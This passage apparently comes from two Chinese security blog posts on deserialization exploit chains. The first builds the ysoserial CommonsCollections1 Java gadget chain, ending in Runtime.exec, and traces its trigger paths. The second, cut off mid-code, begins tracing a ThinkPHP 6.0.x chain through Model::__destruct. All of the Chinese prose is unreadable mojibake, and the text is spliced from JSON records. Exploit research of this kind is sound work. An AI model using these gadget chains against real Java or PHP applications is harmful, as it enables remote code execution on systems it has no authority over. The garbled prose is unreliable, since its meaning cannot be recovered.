Ê≠§Â§ÑÊï¥‰∏Ä‰∏™ÂèçÂ∞ÑÂ∞±ÊòØÂÖàÈÄöËøáClass.forNameËé∑ÂèñÂà∞ÂΩìÂâçÊèèËø∞Âô®ÊâÄÊåá‰ª£ÁöÑÁ±ªÁöÑClassÂØπË±°ÔºåÂêéÁª≠‰ºöÂú®initNonProxyÊàñinitProxyÂáΩÊï∞‰∏≠Â§çÂà∂ËØ•ClassÂØπË±°ÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ(ÂåÖÊã¨Áõ∏ÂÖ≥ÂáΩÊï∞)ÔºåÊúÄÂêéÂú®2044Ë°åÂ§ÑObjectStreamClass.newInstanceÂÆû‰æãÂåñËØ•ÂØπË±°„ÄÇ Âú®ÂÆû‰æãÂåñÂêé‰ºöÁî®ObjectInputStream.readSerialDataÂáΩÊï∞Â∞ÜÂ∫èÂàóÂåñÊµÅ‰∏≠ÁöÑÁõ∏ÂÖ≥Êï∞ÊçÆÂ°´ÂÖÖËøõÂÆû‰æãÂåñÂêéÁöÑÂØπË±°‰∏≠ÊàñË∞ÉÁî®ÂΩìÂâçÁ±ªÊèèËø∞Âô®ÁöÑreadObjectÂáΩÊï∞„ÄÇ ObjectInputStream:readSerialData:2149 ËøôÈáå‰ºöÊ†πÊçÆÂΩìÂâçÁöÑÁ±ªÊèèËø∞Âô®ÊòØÂê¶Â≠òÂú®readObjectÂáΩÊï∞Êù•Ëá™Âä®Ë∞ÉÁî®ËØ•ÂáΩÊï∞ÔºåÊàñËÄÖÊòØÂ°´ÂÖÖÂ∫èÂàóÊµÅ‰∏≠ÁöÑfieldÊï∞ÊçÆ„ÄÇËøôÈáåÁöÑreadObjectÁöÑË∞ÉÁî®Â∏∏‰∏∫Âà©Áî®ÈìæÁöÑ‰∏ÄÈÉ®ÂàÜÔºå‰æãÂ¶ÇCommonsCollections1‰∏≠ÁöÑAnnotationInvocationHandlerÔºåÂêéÊñáÂ∞ÜÂàÜÊûêËØ•ÂáΩÊï∞„ÄÇ Ê≥®ÊÑèÔºöÁî±‰∫éÊàë‰ª¨Áî®ÁöÑÊòØSerializableÊé•Âè£ÔºåÊâÄ‰ª•‰∏äËø∞Âπ∂Êú™ÊèêÂèä‰ΩøÁî®ExternalizableÊé•Âè£ÁöÑÊÉÖÂÜµ„ÄÇ Âà∞Ê≠§‰∏∫Ê≠¢ÔºåÊúÄÂêéËøîÂõûÁöÑÂØπË±°Â∞±ÊòØÊúÄÁªàÊàë‰ª¨ÂæóÂà∞ÁöÑÂ∫èÂàóÂåñÂâçÁöÑÂØπË±°„ÄÇ Â∞èÁªìËøôÈáåÂºïÁî®ÊµÖË∞àJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥û‰øÆÂ§çÊñπÊ°à JavaÁ®ãÂ∫è‰∏≠Á±ªObjectInputStreamÁöÑreadObjectÊñπÊ≥ïË¢´Áî®Êù•Â∞ÜÊï∞ÊçÆÊµÅÂèçÂ∫èÂàóÂåñ‰∏∫ÂØπË±°ÔºåÂ¶ÇÊûúÊµÅ‰∏≠ÁöÑÂØπË±°ÊòØclassÔºåÂàôÂÆÉÁöÑObjectStreamClassÊèèËø∞Á¨¶‰ºöË¢´ËØªÂèñÔºåÂπ∂ËøîÂõûÁõ∏Â∫îÁöÑclassÂØπË±°ÔºåObjectStreamClassÂåÖÂê´‰∫ÜÁ±ªÁöÑÂêçÁß∞ÂèäserialVersionUID„ÄÇ Â¶ÇÊûúÁ±ªÊèèËø∞Á¨¶ÊòØÂä®ÊÄÅ‰ª£ÁêÜÁ±ªÔºåÂàôË∞ÉÁî®resolveProxyClassÊñπÊ≥ïÊù•Ëé∑ÂèñÊú¨Âú∞Á±ª„ÄÇÂ¶ÇÊûú‰∏çÊòØÂä®ÊÄÅ‰ª£ÁêÜÁ±ªÂàôË∞ÉÁî®resolveClassÊñπÊ≥ïÊù•Ëé∑ÂèñÊú¨Âú∞Á±ª„ÄÇÂ¶ÇÊûúÊó†Ê≥ïËß£ÊûêËØ•Á±ªÔºåÂàôÊäõÂá∫ClassNotFoundExceptionÂºÇÂ∏∏„ÄÇ Â¶ÇÊûúÂèçÂ∫èÂàóÂåñÂØπË±°‰∏çÊòØString„ÄÅarray„ÄÅenumÁ±ªÂûãÔºåObjectStreamClassÂåÖÂê´ÁöÑÁ±ª‰ºöÂú®Êú¨Âú∞Ë¢´Ê£ÄÁ¥¢ÔºåÂ¶ÇÊûúËøô‰∏™Êú¨Âú∞Á±ªÊ≤°ÊúâÂÆûÁé∞java.io.SerializableÊàñËÄÖexternalizableÊé•Âè£ÔºåÂàôÊäõÂá∫InvalidClassExceptionÂºÇÂ∏∏„ÄÇÂõ†‰∏∫Âè™ÊúâÂÆûÁé∞‰∫ÜSerializableÂíåExternalizableÊé•Âè£ÁöÑÁ±ªÁöÑÂØπË±°ÊâçËÉΩË¢´Â∫èÂàóÂåñ„ÄÇ ÂâçÈù¢ÂàÜÊûê‰∏≠ÊèêÂà∞ÊúÄÂêé‰ºöË∞ÉÁî®resolveClassËé∑ÂèñÁ±ªÁöÑClassÂØπË±°ÔºåËøôÊòØÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠‰∏Ä‰∏™ÈáçË¶ÅÁöÑÂú∞ÊñπÔºå‰πüÊòØÂøÖÁªè‰πãË∑ØÔºåÊâÄ‰ª•ÊúâÁ†îÁ©∂‰∫∫ÂëòÊèêÂá∫ÈÄöËøáÈáçËΩΩObjectInputStreamÁöÑresolveClassÊù•ÈôêÂà∂ÂèØ‰ª•Ë¢´ÂèçÂ∫èÂàóÂåñÁöÑÁ±ª 0x03 Âà©Áî®ÈìæÂèëÊéòÂêåPHPÁöÑÂèçÂ∫èÂàóÂåñ‰∏ÄÊ†∑ÔºåÂçïÂçïÂèëÁé∞ÂèçÂ∫èÂàóÂåñÁöÑËß¶ÂèëÁÇπÂπ∂‰∏çËÉΩÈÄ†Êàê‰∏•ÈáçÁöÑÂΩ±Âìç„ÄÇÂæÄÂæÄÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂç±ÂÆ≥Á®ãÂ∫¶ÂèñÂÜ≥‰∫éÂêéÁª≠ÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊâÄËÉΩËææÂà∞ÁöÑÂç±Èô©Á®ãÂ∫¶„ÄÇÂú®java‰∏≠ysoserialÂ∑•ÂÖ∑ÁªôÊàë‰ª¨Êèê‰æõ‰∫ÜËÆ∏Â§öÂ∏∏ËßÅÁöÑÂ∫ìÂ≠òÂú®ÁöÑÂà©Áî®ÈìæÔºåËøô‰∏ÄËäÇÂ∞ÜÈÄê‰∏ÄÂàÜÊûêËøô‰∫õÂà©Áî®Èìæ„ÄÇ 1. CommonsCollections1(jdk&lt;=7)ÂèÇËÄÉÈìæÊé• Apache Commons CollectionsÊòØ‰∏Ä‰∏™Êâ©Â±ï‰∫ÜJavaÊ†áÂáÜÂ∫ìÈáåÁöÑCollectionÁªìÊûÑÁöÑÁ¨¨‰∏âÊñπÂü∫Á°ÄÂ∫ìÔºåÂÆÉÊèê‰æõ‰∫ÜÂæàÂ§öÂº∫ÊúâÂäõÁöÑÊï∞ÊçÆÁªìÊûÑÁ±ªÂûãÂπ∂‰∏îÂÆûÁé∞‰∫ÜÂêÑÁßçÈõÜÂêàÂ∑•ÂÖ∑Á±ª„ÄÇ‰Ωú‰∏∫ApacheÂºÄÊ∫êÈ°πÁõÆÁöÑÈáçË¶ÅÁªÑ‰ª∂ÔºåCommons CollectionsË¢´ÂπøÊ≥õÂ∫îÁî®‰∫éÂêÑÁßçJavaÂ∫îÁî®ÁöÑÂºÄÂèë„ÄÇ CommonsCollection1ÁöÑÂàÜÊûêÊñáÁ´†ÊØîËæÉÂ§öÔºåÂàöÂºÄÂßãÂÖà‰ªéËøô‰∏™gadgetÂºÄÂßãÂàÜÊûê„ÄÇËøôÈáåÊàëÁî®ÁöÑÂàÜÊûêÊñπÊ≥ïÊòØÂÖàÂÜô‰∏Ä‰∏™Ëß¶ÂèëÁÇπÔºåÁÑ∂ÂêéÁî®ysoserialÁîüÊàêpayloadÊù•Ë∞ÉËØï„ÄÇ CommonsCollections1 payloadÈíàÂØπÁöÑcommons-collections 3.1ÁâàÊú¨ÔºåÂÖàÂºïÂÖ•Â∫ì 123456&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; Âú®ysoserialÁöÑexp‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞‰∏ÄÊï¥‰∏™Ë∞ÉÁî®ÁöÑÈìæ Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Âà©Áî®ÈìæÁöÑÊúÄÂêéË∞ÉÁî®‰∫ÜRuntime.getRuntime().exec()ÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÈúÄË¶ÅÂú®Ââç‰∏ÄÊ≠•ÁöÑÈìæ‰∏äÂèØ‰ª•ËææÂà∞Ë∞ÉÁî®‰ªªÊÑèÁ±ªÂíåÊñπÊ≥ïÁöÑÂáΩÊï∞„ÄÇ CommonsCollections1Áî®ÁöÑÂ∞±ÊòØ3.1ÁâàÊú¨‰∏ãÁöÑInvokerTransformer.transform() 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); &#125;&#125; Ê≠§Â§ÑÁî®ÁöÑÂ∞±ÊòØJavaÁöÑÂèçÂ∞ÑÊú∫Âà∂ÔºåÂä®ÊÄÅË∞ÉÁî®Á±ªÂíåÊñπÊ≥ï„ÄÇ‰∏∫‰∫ÜËÉΩÂä®ÊÄÅË∞ÉÁî®‰ªªÊÑèÁ±ªÂáΩÊï∞ÔºåÊàë‰ª¨ËøòÂæóÊéßÂà∂iMethodName„ÄÅiParamTypes„ÄÅiArgsÔºåËØ•Á±ªÂ±ûÊÄßÂÆö‰πâÂú®InvokerTransformerÁöÑÊûÑÈÄ†ÂáΩÊï∞‰∏ä 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; ÈÇ£‰πàÊé•‰∏ãÊù•Â∞±Ë∑üphpÁ±ª‰ºº‰∫ÜÔºåÊâæ‰∏Ä‰∏™Á±ªÔºåÂÆÉÁöÑÁ±ªÂ±ûÊÄßÂèØÊéßÔºå‰∏îËØ•Á±ªÂ±ûÊÄßÂêéÁª≠Ëøò‰ºöË∞ÉÁî®transformÂáΩÊï∞„ÄÇÁî±‰∫éÂÆåÊàêRuntime.getRuntime().exec()Âä®‰ΩúÈúÄË¶ÅÂ§öÊ¨°Ë∞ÉÁî®transformÂáΩÊï∞ÔºàÂÖàË∞ÉÁî®Runtime.getRuntimeÂÜçË∞ÉÁî®Runtime.execÔºâÔºåÊâÄ‰ª•ËøòÂæóÊâæ‰∏Ä‰∏™ËÉΩÂ§öÊ¨°Ë∞ÉÁî®transformÁöÑÂú∞ÊñπÔºåÊù•Áúã‰∏Ä‰∏ãChainedTransformer 12345678private final Transformer[] iTransformers;// Â°´ÂÖÖÊûÑÈÄ†ÂêéÁöÑÂÆû‰æãpublic Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object);// Ë∞ÉÁî®ÈìæÔºå &#125; return object;&#125; Âú®TransformerÁöÑÂ≠êÁ±ª‰∏ãÈù¢ÊâæÂà∞ËÉΩÁîüÊàêÂëΩ‰ª§ÊâßË°åÁöÑÂà©Áî®ÈìæÂç≥ÂèØÔºåÊù•ÂàÜÊûê‰∏Ä‰∏ãCommonCollections1ÁöÑÊûÑÈÄ† 123456789101112// real chain for after setupfinal Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class),// Ëé∑ÂèñRuntimeÂØπË±° new InvokerTransformer(\"getMethod\", new Class[] &#123;//Ëé∑ÂèñRuntime.getRuntime()ÊñπÊ≥ïÂØπË±° String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;// ÂèçÂ∞ÑË∞ÉÁî®invoke,ÂÜçinvokeÊâßË°åRuntime.getRuntime()ÊñπÊ≥ïÔºåËé∑ÂèñRuntimeÂÆû‰æãÂåñÂØπË±° Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\",// ÂèçÂ∞ÑË∞ÉÁî®execÊñπÊ≥ïÔºåÊâßË°åÊúÄÁªàÁöÑÂëΩ‰ª§ new Class[] &#123; String.class &#125;, execArgs), new ConstantTransformer(1) &#125;; ÈìæÁöÑÁ¨¨‰∏Ä‰∏™ÁªìÁÇπÈÄâÁî®ÁöÑÊòØConstantTransformerÔºåÂÖ∂transformerÁõ¥Êé•ËøîÂõûÊûÑÈÄ†Êó∂ÁöÑÂØπË±° 123456789private final Object iConstant;// Ê≠§Êó∂iConstantÁΩÆ‰∏∫Runtime.classpublic ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;// Áõ¥Êé•ËøîÂõûRuntime.class return iConstant;&#125; ÊúÄÁªàÁöÑË∞ÉÁî®ÔºåÁ±ª‰ºº 1234567891011Object obj = Runtime.class;Class cls = obj.getClass();Method method;method = cls.getMethod(\"getMethod\",new Class[] &#123;String.class, Class[].class &#125;);obj = method.invoke(obj, new Object[] &#123;\"getRuntime\", new Class[0] &#125;);cls = obj.getClass();method = cls.getMethod(\"invoke\",new Class[] &#123;Object.class, Object[].class &#125;);obj = method.invoke(obj, new Object[] &#123;null, new Object[0] &#125;);cls = obj.getClass();method = cls.getMethod(\"exec\",new Class[] &#123; String.class &#125;);method.invoke(obj, new String[] &#123; \"open /System/Applications/Calculator.app\" &#125;); Êé•‰∏ãÊù•ÁöÑÈóÆÈ¢òÊòØÂ¶Ç‰ΩïËß¶ÂèëChainedTransformerÔºüÊêúÁ¥¢‰∏Ä‰∏ãË∞ÉÁî®transformÁöÑ‰ΩçÁΩÆÔºåÊéíÈô§ÊéâxxxTransformerÁ±ªÔºåÊúÄÊúâÂèØËÉΩË¢´Âà©Áî®ÁöÑÂ∞±ÊòØLazyMap.get„ÄÅTransformedMap.checkSetValueÔºåÂÖ∂‰∏≠checkSetValue‰ºöÂú®setValueÂáΩÊï∞Ë¢´Ë∞ÉÁî®ÁöÑÊó∂ÂÄôË∞ÉÁî®„ÄÇ Êé•‰∏ãÊù•Â∞±ÊòØÊâæËÉΩËß¶Âèë‰∏äÈù¢‰∏§‰∏™Âà©Áî®ÊñπÂºèÁöÑÊñπÊ≥ï„ÄÇ ÂêåÊ†∑ÁöÑÔºåÂâçÈù¢Âü∫Á°ÄÁü•ËØÜÊèêÂà∞ÔºåÂ¶ÇÊûú‰∏Ä‰∏™ÂØπË±°ÁöÑreadObjectÂáΩÊï∞Ë¢´ÈáçËΩΩ‰∫ÜÔºå‰ºö‰ºòÂÖàË∞ÉÁî®ÈáçËΩΩÂêéÁöÑreadObjectÂáΩÊï∞„ÄÇ Êàë‰ª¨ÊúÄÂ•ΩËÉΩÂú®Ë¢´ÈáçËΩΩÁöÑreadObjectÂáΩÊï∞‰∏≠ÂèëÁé∞Áõ∏ÂÖ≥ÂèØÊéßMapÊï∞ÊçÆÁöÑÊìç‰Ωú(getÂíåsetValue)„ÄÇ ËÄåexp‰∏≠sun.reflect.annotation.AnnotationInvocationHandlerÈùûÂ∏∏Á¨¶Âêà‰∏äËø∞ÁöÑÊèèËø∞„ÄÇ Êù•Áúã‰∏Ä‰∏ãËøô‰∏™Á±ªÁöÑreadObjectÂÆûÁé∞ 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; Âú®Á¨¨26Ë°åÂ§ÑÔºåË∞ÉÁî®‰∫ÜmemberValue.setValueÔºåËøôÈáåÁöÑmemberValueÊàë‰ª¨ÂèØ‰ª•Â∞ÜÂÖ∂ÁΩÆ‰∏∫ÊûÑÈÄ†Â•ΩÁöÑTransformedMapÂÆû‰æã„ÄÇ Âú®Ëøô‰∏™TransformedMapÂÆû‰æã‰∏äÔºåvalueTransformerÂ±ûÊÄßË¢´ÁΩÆ‰∏∫ÂâçÊñáÁöÑChainedTransformer„ÄÇËøôÊ†∑Ëøô‰∏™ÈìæÂ∞±‰∏≤Ëµ∑Êù•‰∫ÜÔºåÊÄªÁªì‰∏Ä‰∏ã 1234sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValue.setValue() =&gt; TransformedMap.setValue() =&gt; TransformedMap.checkSetValue() -&gt; valueTransformer.transform() =&gt; ChainedTransformer.transform() -&gt; ÂâçÊñáÊûÑÈÄ†ÁöÑRuntime.getRuntime().exec() Á¨¨‰∫åÁßçÔºåÂà©Áî®LazyMap.get() CommonsCollections1‰∏≠Âà©Áî®‰∫ÜAnnotationInvocationHandler.invokeÂáΩÊï∞ 123456789101112131415161718public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); // ... switch(member) &#123; case \"toString\": return toStringImpl(); case \"hashCode\": return hashCodeImpl(); case \"annotationType\": return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); // ...&#125; Á¨¨15Ë°åË∞ÉÁî®‰∫ÜmemberValues.getÂáΩÊï∞ÔºåËøôÈáåÂ¶ÇÊûúmemberValuesËÆæÁΩÆ‰∏∫ÊûÑÈÄ†Â•ΩÁöÑLazyMapÂÆû‰æãÔºåÂ∞ÜËß¶ÂèëËØ•Âà©Áî®ÈìæÁöÑÊâßË°å„ÄÇ ÈÇ£‰πàÊÄé‰πàÊù•Ë∞ÉÁî®invokeÂáΩÊï∞Âë¢ÔºüËøôÈáåÁî®Âà∞‰∫ÜProxyÂä®ÊÄÅ‰ª£ÁêÜÊú∫Âà∂„ÄÇÂú®ËØ•Êú∫Âà∂‰∏ãË¢´‰ª£ÁêÜÁöÑÂÆû‰æã‰∏çÁÆ°Ë∞ÉÁî®‰ªÄ‰πàÁ±ªÊñπÊ≥ïÔºåÈÉΩ‰ºöÂÖàË∞ÉÁî®invokeÂáΩÊï∞„ÄÇ ÈÇ£‰πàÊàë‰ª¨Âà©Áî®ProxyÂä®ÊÄÅ‰ª£ÁêÜAnnotationInvocationHandlerÔºåÂπ∂Â∞ÜmemberValuesËÆæÁΩÆ‰∏∫LazyMap„ÄÇÂú®AnnotationInvocationHandler.readObjectÂáΩÊï∞ÈáåÔºåÁ¨¨19Ë°åË∞ÉÁî®‰∫ÜmemberValues.entrySetÂáΩÊï∞„ÄÇÂú®Âä®ÊÄÅ‰ª£ÁêÜ‰∏ã‰ºöÂÖàË∞ÉÁî®invokeÂáΩÊï∞Ôºå‰∏îÊ≠§Êó∂ÁöÑÂáΩÊï∞ÂêçentrySet‰∏çÂú®toString„ÄÅhashCode„ÄÅannotationTypeÈáåÔºåÈÇ£‰πà‰ºöÊúÄÁªàËµ∞Âà∞Á¨¨15Ë°åÁöÑ‰ΩçÁΩÆ„ÄÇÊÄªÁªì‰∏Ä‰∏ãËøô‰∏™Ë∞ÉÁî®Èìæ 123456sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValues.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; memberValues.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; ÂâçÊñáÊûÑÈÄ†ÁöÑRuntime.getRuntime().exec() Ëøô‰πüÊòØysoserialÁöÑCommonsCollections1ÁöÑË∞ÉÁî®Èìæ„ÄÇ ÂêéÁª≠ÁöÑÂà©Áî®ÈìæÂàÜÊûêÊîæÂú®‰∏ã‰∏ÄÁØáÊñáÁ´†Èáå„ÄÇ 0x04 ÊÄªÁªìÁªèËøáÂØπysoserialÂ∑•ÂÖ∑ÁîüÊàêÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÁöÑË∞ÉËØïÔºåÁÜüÊÇâ‰∫ÜJavaÁöÑÂèçÂ∫èÂàóÂåñÁöÑ‰∏Ä‰∏™ÊµÅÁ®ã„ÄÇ‰ΩÜÂØπ‰∫éexpÁöÑ‰π¶ÂÜô‰ªçÁÑ∂ÊúâÂæÖÊèêÈ´ò„ÄÇ ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåCommonCollections1Âíå3Áî®ÁöÑoverride.class‰Ωú‰∏∫AnnotationÂú®jdk8‰∏äÊòØ‰∏çÈÄÇÁî®ÁöÑÔºåË¶ÅË∞ÉËØïËøô‰∏§‰∏™payloadÈúÄË¶ÅÁî®jdk7ÔºåÂèÇËÄÉ Èô§Ê≠§‰πãÂ§ñÔºåÂú®Ë∞ÉËØïËøáÁ®ã‰∏≠Ôºå‰Ωì‰ºöÂà∞‰∫ÜjavassistÂ∫ìÁöÑÂº∫Â§ßÔºå‰øÆÊîπjarÂåÖÈáåÁöÑclassÊñá‰ª∂ÈùûÂ∏∏ËàíÊúçÔºÅ ProxyÁöÑÂä®ÊÄÅ‰ª£ÁêÜÊú∫Âà∂ÔºåJavaÁöÑÂèçÂ∞ÑÊú∫Âà∂Áõ∏‰ø°‰ºöÊòØÂêéÁª≠Â≠¶‰π†ÁöÑ‰∏Ä‰∏™ÈáçÁÇπÔºåÁªßÁª≠üí™ÔºÅ"},{"title":"„ÄêCode Review„Äëthinkphp v6.0.x ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò","permalink":"http://blog.0kami.cn/2019/09/10/php-thinkphp-6-0-x-ÂèçÂ∫èÂàóÂåñÂà©Áî®Èìæ/","text":"0x00 ÂâçË®Ä‰∏ä‰∏ÄÁØáÂàÜÊûê‰∫Ütp 5.2.xÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéòÔºåÈ°∫ÁùÄÊÄùË∑ØÔºåÊäätp6.0.x‰πüÊåñ‰∫Ü„ÄÇÊúâÁ±ª‰ººÁöÑÂú∞ÊñπÔºå‰πüÊúâÈúÄË¶ÅÈáçÊñ∞ÊåñÊéòÁöÑÂú∞Êñπ„ÄÇ 0x01 ÁéØÂ¢ÉÂáÜÂ§áÈááÁî®composerÂÆâË£Ö6.0.*-devÁâàÊú¨ 1composer create-project topthink/think=6.0.x-dev v6.0 0x02 Âà©Áî®ÈìæÂàÜÊûêËÉåÊôØÂõûÈ°æÊãøÂà∞v6.0.xÁâàÊú¨ÔºåÁÆÄÂçïÁöÑÁúã‰∫Ü‰∏Ä‰∏ãÔºåÊúâ‰∏Ä‰∏™Â•ΩÊ∂àÊÅØÂíå‰∏Ä‰∏™ÂùèÊ∂àÊÅØ„ÄÇ Â•ΩÊ∂àÊÅØÊòØ5.2.xÁâàÊú¨ÂáΩÊï∞Âä®ÊÄÅË∞ÉÁî®ÁöÑÂèçÂ∫èÂàóÂåñÈìæÂêéÂçäÈÉ®ÂàÜÔºåËøòÂèØ‰ª•Âà©Áî®„ÄÇ ÂùèÊ∂àÊÅØÊòØÂâçÈù¢5.1.xÔºå5.2.xÁâàÊú¨ÈÉΩÂü∫‰∫éËß¶ÂèëÁÇπWindowsÁ±ªÁöÑ__destruct,Â•ΩÂ∑ß‰∏çÂ∑ßÁöÑÊòØ6.0.xÁâàÊú¨ÂèñÊ∂à‰∫ÜWindowsÁ±ª„ÄÇËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÂæóÈáçÊñ∞Êâæ‰∏Ä‰∏™ÂêàÈÄÇÁöÑËµ∑ÂßãËß¶ÂèëÁÇπÔºåÊâçËÉΩÁªßÁª≠‰ΩøÁî®‰∏äÈù¢ÁöÑÂ•ΩÊ∂àÊÅØ„ÄÇ vendor/topthink/think-orm/src/Model.php Êñ∞Ëµ∑ÂßãËß¶ÂèëÁÇπ‰∏∫‰∫ÜËäÇÁúÅÁØáÂπÖÔºåÂêéÊñá‰∏çÂÜçÈáçÂ§ç‰ªãÁªçËß¶Âèë__toStringÂáΩÊï∞ÂêéÁöÑÂà©Áî®ÈìæÔºåËøôÈÉ®ÂàÜÂêå5.2.xÁâàÊú¨Áõ∏Âêå(‰∏çËøáwonderkunÂ∏àÂÇÖÁöÑÂà©Áî®ÈìæÂ∑≤Â§±ÊïàÔºåÂä®ÊÄÅÂáΩÊï∞Ë∞ÉÁî®ÁöÑÂà©Áî®ÈìæËøòËÉΩÁî®)„ÄÇ ÈÄöÂ∏∏ÊúÄÂ•ΩÁöÑÂèçÂ∫èÂàóÂåñËµ∑ÂßãÁÇπ‰∏∫__destruct„ÄÅ__wakeupÔºåÂõ†‰∏∫Ëøô‰∏§‰∏™ÂáΩÊï∞ÁöÑË∞ÉÁî®Âú®ÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠ÈÉΩ‰ºöËá™Âä®Ë∞ÉÁî®ÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖàÊù•ÊâæÊ≠§Á±ªÂáΩÊï∞„ÄÇËøôÈáåÊàëÊâæ‰∫Üvendor/topthink/think-orm/src/Model.phpÁöÑ__destructÂáΩÊï∞„ÄÇ 1234567891011121314151617public function __destruct()&#123; if ($this-&gt;lazySave) &#123;// ÊûÑÈÄ†lazySave‰∏∫trueÔºåËøõÂÖ•saveÂáΩÊï∞ $this-&gt;save(); &#125;&#125;public function save(array $data = [], string $sequence = null): bool&#123; // ... if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) &#123; return false; &#125; $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); // ...&#125; È¶ñÂÖàÊûÑÈÄ†lazySaveÁöÑÂÄº‰∏∫true,‰ªéËÄåËøõÂÖ•saveÂáΩÊï∞„ÄÇ ËøôÊ¨°Ëß¶ÂèëÁÇπ‰Ωç‰∫éupdateDataÂáΩÊï∞ÂÜÖÔºå‰∏∫‰∫ÜÈò≤Ê≠¢ÂâçÈù¢ÁöÑÊù°‰ª∂Á¨¶ÂêàÔºåËÄåÁõ¥Êé•returnÔºåÊàë‰ª¨È¶ñÂÖàÈúÄË¶ÅÊûÑÈÄ†Áõ∏ÂÖ≥ÂèÇÊï∞ 1234567891011public function isEmpty(): bool&#123; return empty($this-&gt;data);&#125;protected function trigger(string $event): bool&#123; if (!$this-&gt;withEvent) &#123; return true; &#125; // ... ÂÖ∂‰∏≠ÈúÄ‰øùËØÅisEmptyËøîÂõûfalseÔºå‰ª•Âèä$this-&gt;trigger(&#39;BeforeWrite&#39;)ËøîÂõûtrue ÊûÑÈÄ†$this-&gt;data‰∏∫ÈùûÁ©∫Êï∞ÁªÑ ÊûÑÈÄ†$this-&gt;withEvent‰∏∫false ÊûÑÈÄ†$this-&gt;exists‰∏∫true ‰ªéËÄåËøõÂÖ•Êàë‰ª¨ÈúÄË¶ÅÁöÑupdateDataÂáΩÊï∞ÔºåÊù•Áúã‰∏Ä‰∏ãËØ•ÂáΩÊï∞ÂÜÖÂÆπ 12345678910111213141516171819202122protected function updateData(): bool&#123; // ‰∫ã‰ª∂ÂõûË∞É if (false === $this-&gt;trigger('BeforeUpdate')) &#123;// Ê≠§Â§ÑÂâçÈù¢Â∑≤Á¨¶ÂêàÊù°‰ª∂ return false; &#125; // ... // Ëé∑ÂèñÊúâÊõ¥Êñ∞ÁöÑÊï∞ÊçÆ $data = $this-&gt;getChangedData(); if (empty($data)) &#123; // ÂÖ≥ËÅîÊõ¥Êñ∞ if (!empty($this-&gt;relationWrite)) &#123; $this-&gt;autoRelationUpdate(); &#125; return true; &#125; // ... // Ê£ÄÊü•ÂÖÅËÆ∏Â≠óÊÆµ $allowFields = $this-&gt;checkAllowFields(); // Ëß¶Âèë__toString ÂêåÊ†∑ÁöÑÔºå‰∏∫‰∫ÜÈò≤Ê≠¢ÊèêÂâçreturnÔºåÈúÄË¶ÅÁ¨¶Âêà$dataÈùûÁ©∫ÔºåÊù•Áúã‰∏Ä‰∏ãgetChangedData 1234567891011121314public function getChangedData(): array&#123; $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) &#123; 